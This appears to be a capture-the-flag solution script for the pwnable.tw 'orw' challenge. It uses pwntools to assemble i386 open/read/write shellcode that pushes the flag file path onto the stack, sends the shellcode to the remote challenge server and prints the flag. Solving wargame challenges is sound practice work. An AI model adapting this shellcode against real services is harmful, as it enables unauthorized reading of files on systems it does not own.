#!/usr/bin/python3

from pwn import *

#path_flag = b"/mnt/d/flag"
path_flag = b'/home/orw/flag'
exe = ELF('./orw')




context.arch = 'i386'

#p =gdb.debug([exe.path], "b * main+10 \n c \n call (int)mprotect(0x0804a000, 0x1000, 7) \n c \n c ")
p = remote('chall.pwnable.tw',10001)
shellcode = b""

while len(path_flag)%4 !=0:
    path_flag += b'\0'

for i in range(len(path_flag)-4,-1,-4) :
    chunk = path_flag[i:i+4]
    shellcode += asm(f'mov eax,{u32(chunk)}; push eax')



shellcode += asm('''
    mov ebx,esp
    mov ecx,0
    mov edx,0
    mov eax, 5
    int 0x80
    
                 
    mov ebx,eax
    mov ecx,esp
    mov edx,100
    mov eax,3
    int 0x80
                 
    mov ebx, 01
    mov eax,4
    int 0x80


''',os='linux', arch='i386')



p.sendlineafter("Give my your shellcode:",shellcode)

output = p.recvall()
log.info(output)
p.interactive()

